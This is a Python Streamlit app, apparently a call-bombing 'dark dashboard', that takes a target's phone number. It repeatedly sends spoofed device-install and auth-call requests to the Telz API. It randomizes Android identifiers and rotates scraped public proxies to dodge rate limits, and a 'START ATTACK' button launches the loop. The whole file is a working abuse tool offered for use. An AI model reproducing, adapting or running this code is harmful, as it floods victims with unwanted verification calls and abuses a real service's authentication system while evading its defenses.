import streamlit as st
import subprocess
import sys
import random
import time
import uuid
import string
import json
import webbrowser
import os
from concurrent.futures import ThreadPoolExecutor

# --- إعدادات الصفحة والجمالية المخيفة ---
st.set_page_config(page_title="GX3GX3 CONTROL PANEL", page_icon="💀", layout="wide")

# CSS مخصص للوحة تحكم مخيفة واحترافية
st.markdown("""
    <style>
    .main {
        background-color: #000000;
        color: #00FF00;
        font-family: 'Courier New', Courier, monospace;
    }
    .stButton>button {
        width: 100%;
        background-color: #ff0000;
        color: white;
        border-radius: 0px;
        border: 1px solid #ffffff;
        font-weight: bold;
    }
    .stButton>button:hover {
        background-color: #8b0000;
        border: 1px solid #ff0000;
    }
    h1, h2, h3 {
        color: #ff0000 !important;
        text-shadow: 2px 2px #000000;
    }
    .reportview-container .main .block-container{
        padding-top: 2rem;
    }
    .stTextInput>div>div>input {
        background-color: #1a1a1a;
        color: #00FF00;
        border: 1px solid #ff0000;
    }
    </style>
    """, unsafe_allow_html=True)

# --- تثبيت المكتبات تلقائياً (محفوظ كما هو) ---
def install_libs():
    libs = ['requests', 'termcolor', 'pyfiglet']
    for lib in libs:
        try:
            __import__(lib)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib])

install_libs()

import requests
from termcolor import colored
import pyfiglet

# --- واجهة الحقوق والعنوان ---
ascii_art = pyfiglet.figlet_format("GX3GX3", font="slant")
st.text(ascii_art)
st.title("💀 DARK DASHBOARD - BY GX3GX3")
st.markdown("### 🛠 المطور: @PDD6P | حقوق القناة: [gx1gx1](https://t.me/gx1gx1)")
st.divider()

# --- المنطق البرمجي (بدون حذف أي شيء) ---

def generate_unique_ids():
    timestamp = int(time.time() * 1000)
    random_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    unique_uuid = uuid.uuid4()
    return timestamp, random_id, unique_uuid

def fetch_internal_proxies():
    proxies = []
    urls = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all",
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all"
    ]
    for url in urls:
        try:
            res = requests.get(url, timeout=10)
            if res.status_code == 200:
                for line in res.text.splitlines():
                    if ":" in line:
                        proxies.append(line.strip())
        except: pass
    return proxies

def is_proxy_working(proxy_dict):
    try:
        response = requests.get("https://www.google.com", proxies=proxy_dict, timeout=3)
        return response.status_code == 200
    except:
        return False

def load_proxies(filename="gx1gx1.txt"):
    all_proxies = []
    if os.path.exists(filename):
        with open(filename, "r") as f:
            all_proxies.extend([l.strip() for l in f.read().splitlines() if l.strip()])
    
    internal = fetch_internal_proxies()
    all_proxies.extend(internal)
    return list(set(all_proxies))

def get_working_proxy(proxies_list):
    for _ in range(10):
        if not proxies_list: return None
        raw_proxy = random.choice(proxies_list)
        if not raw_proxy.startswith(("http", "socks")):
            proxy_url = f"http://{raw_proxy}"
        else:
            proxy_url = raw_proxy
        
        proxy_dict = {"http": proxy_url, "https": proxy_url}
        if is_proxy_working(proxy_dict):
            return proxy_dict
    return None

def send_install_request(url, headers, payload, proxy=None):
    try:
        response = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=10)
        return response.ok and "ok" in response.text
    except: return False

def send_auth_call_request(url, headers, payload, proxy=None):
    try:
        response = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=10)
        return response.ok and "ok" in response.text
    except: return False

# --- واجهة المستخدم لإدخال البيانات ---
col1, col2 = st.columns(2)
with col1:
    country_code = st.text_input("🌍 أدخل رمز الدولة (بدون +):", value="964")
with col2:
    number = st.text_input("📱 أدخل الرقم (بدون المقدمة):")

num_threads = st.slider("🚀 عدد الخيوط (Threads):", 1, 50, 15)

# متغيرات الحالة لتحديث الواجهة
if 'stats' not in st.session_state:
    st.session_state.stats = {"ok": 0, "error": 0}
if 'running' not in st.session_state:
    st.session_state.running = False

def start_process(country_code, number, num_threads):
    foreign_langs = ["en", "fr", "de", "tr", "es", "pt", "it", "ko", "ru", "ja", "zh", "ar", "hi"]
    proxies_list = load_proxies("gx1gx1.txt")
    
    install_url = "https://api.telz.com/app/install"
    auth_call_url = "https://api.telz.com/app/auth_call"
    headers = {'User-Agent': "Telz-Android/17.5.17", 'Content-Type': "application/json"}

    placeholder = st.empty()

    while st.session_state.running:
        foxx, fox, foxer = generate_unique_ids()
        random_android_version = str(random.randint(7, 14))
        random_lang = random.choice(foreign_langs)
        proxy = get_working_proxy(proxies_list)

        payload_install = json.dumps({
            "android_id": fox, "app_version": "17.5.17", "event": "install",
            "google_exists": "yes", "os": "android", "os_version": random_android_version,
            "play_market": True, "ts": foxx, "uuid": str(foxer)
        })

        try:
            if send_install_request(install_url, headers, payload_install, proxy):
                payload_auth_call = json.dumps({
                    "android_id": fox, "app_version": "17.5.17", "attempt": "0",
                    "event": "auth_call", "lang": random_lang, "os": "android",
                    "os_version": random_android_version, "phone": f"+{country_code}{number}",
                    "ts": foxx, "uuid": str(foxer)
                })
                if send_auth_call_request(auth_call_url, headers, payload_auth_call, proxy):
                    st.session_state.stats["ok"] += 1
                else: st.session_state.stats["error"] += 1
            else: st.session_state.stats["error"] += 1
        except: st.session_state.stats["error"] += 1

        with placeholder.container():
            st.metric("✅ Success", st.session_state.stats["ok"])
            st.metric("❌ Failed", st.session_state.stats["error"])
        
        time.sleep(0.1) # لمنع تجميد المتصفح

# أزرار التحكم
if st.button("🔥 START ATTACK"):
    if number:
        st.session_state.running = True
        st.success(f"تم بدء العملية للرقم: +{country_code}{number}")
        start_process(country_code, number, num_threads)
    else:
        st.error("الرجاء إدخال رقم الهاتف أولاً!")

if st.button("🛑 STOP"):
    st.session_state.running = False
    st.warning("تم إيقاف العملية.")

# --- تذييل الصفحة ---
st.markdown("---")
st.markdown("<p style='text-align: center; color: gray;'>Developed by @PDD6P | Rights Reserved to GX3GX3</p>", unsafe_allow_html=True)
